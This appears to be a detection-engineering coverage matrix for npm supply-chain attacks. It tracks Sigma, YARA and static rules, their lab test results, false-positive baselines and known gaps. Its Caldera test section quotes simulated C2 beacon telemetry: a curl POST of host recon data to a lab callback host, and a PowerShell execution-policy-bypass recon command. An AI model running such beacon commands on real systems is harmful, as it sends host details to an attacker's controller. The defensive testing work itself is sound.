# Coverage matrix

Status as of 2026-07-22. All rules tested against simulated telemetry in controlled
lab environments. False positive baseline completed 2026-07-22, see
`false-positives.md` for full results and tuning decisions.

| Technique | ATT&CK ID | Rule | Tested | Result |
|---|---|---|---|---|
| Lifecycle script execution | T1059.007 | sigma/suspicious_child_process_from_npm.yml | yes, Windows VM, postinstall-callback-simulator.js, 2026-07-20. FP baseline run 2026-07-22, Ubuntu VM, 8 packages | 4 matches across 2 simulation runs. FP baseline: 0 hits across bcrypt, sqlite3, canvas, husky, puppeteer, lodash, express, axios. Native modules installed via prebuilt binaries, no node-gyp shell spawning observed. See false-positives.md. |
| Git hook abuse | T1546 (closest fit) | sigma/process_execution_from_git_hooks.yml | yes, real auditd telemetry, Ubuntu VM, 2026-07-18. FP baseline run 2026-07-22, Ubuntu VM, 2 commits | condition confirmed true by manual check. FP baseline: 0 hits across 2 git commits in repo with no hooks installed. Expected — rule only fires when a hook is actually invoked. See false-positives.md. |
| Known malicious package name | T1195.001 | yara/DPRK_NPM_Known_Malicious_Package_Name | verified against synthetic strings, not real telemetry | matched intended string, did not match clean sample |
| Lifecycle plus network heuristic | T1195.001 | yara/Suspicious_NPM_Package_Lifecycle_Network_Heuristic | verified against synthetic strings, not real telemetry | matched intended pattern, did not match clean sample |
| Lifecycle script presence, static | T1195.001 | static-checks/check_package_lifecycle_scripts.py | tested against synthetic package.json fixtures | correctly flagged lifecycle scripts and known bad name, correctly skipped node_modules, correctly passed clean input |

## Known gaps, not yet covered by a rule

From `01-research/attack-mapping.md`, rows 5, 7, and 9: C2 (command and control)
callback rarity detection, credential and wallet theft on host, and require time
(not install time) execution. Row 6 (T1071, application layer C2) was exercised
via Caldera on 2026-07-22, see note below. Rows 7 and 9 remain unbuilt and are
listed here deliberately.

The FP baseline for Rule 2 also has a documented gap: the expected FP behavior
(a legitimate pre-commit linter triggering the rule) was not observed because the
test repo had no hooks installed. Installing husky or pre-commit and committing
again would be the right follow-up to confirm the FP behavior before adding an
exclusion condition.

## Git hook rule, tested 2026-07-18

Ran as a real pre-commit hook on the Ubuntu VM with auditd capturing execve. The
invocation (`/usr/bin/env bash .git/hooks/pre-commit`) was captured, and
`.git/hooks/pre-commit` appears in both the `proctitle` and `EXECVE` fields, so the
rule's condition is true for this event. auditd has no native `CommandLine` field,
the match was confirmed by hand against `proctitle` and `EXECVE` argv, not by
running the rule through an actual conversion backend. A real deployment would need
a small pySigma processing pipeline mapping `CommandLine` to `proctitle` for this
to convert and run automatically. pySigma is the Python library used to convert
Sigma rules into platform-specific query languages.

## Caldera C2 beacon, tested 2026-07-22

A custom Caldera ability (BeaverTail HTTP C2 Beacon, T1071.001) was run against
Sandcat agents on both the Ubuntu VM (192.168.56.2) and the Windows 11 VM
(192.168.56.3). The Caldera server ran on the Mac host (192.168.56.1:8888)
connected via VirtualBox host-only network.

**Ubuntu (auditd):**

```text
Sandcat agent (pid=135108)
  └── sh -c curl ... (pid=137616)
        ├── hostname (recon)
        └── curl -s -X POST http://192.168.56.1:8787/callback
              -d {"host": "dev-vm", "user": "devuser", "os": "...", "cwd": "/home/devuser"}
```

**Windows (Sysmon):**

```text
Sandcat agent splunkd.exe (pid=3128)
  └── powershell.exe -ExecutionPolicy Bypass -C "curl ... $(hostname) ... $(whoami)" (pid=4232)
        ├── HOSTNAME.EXE (pid=3936)
        └── whoami.exe (pid=1920)
```

Sysmon Event ID 1 captured the full parent/child chain. Event ID 3 captured the
network connection from splunkd.exe (192.168.56.3 → 192.168.56.1:8888). The
ability ran the Linux sh command via PowerShell, which resolved $(hostname) and
$(whoami) as native Windows executables, producing discrete child process events
for each recon command — more telemetry than the Ubuntu run, not less.

Both runs confirmed the behavior pattern: an agent receiving a task and making an
outbound HTTP POST carrying host recon data, directly matching the documented
WAVESHAPER.V2 callback behavior from the anchor incident.

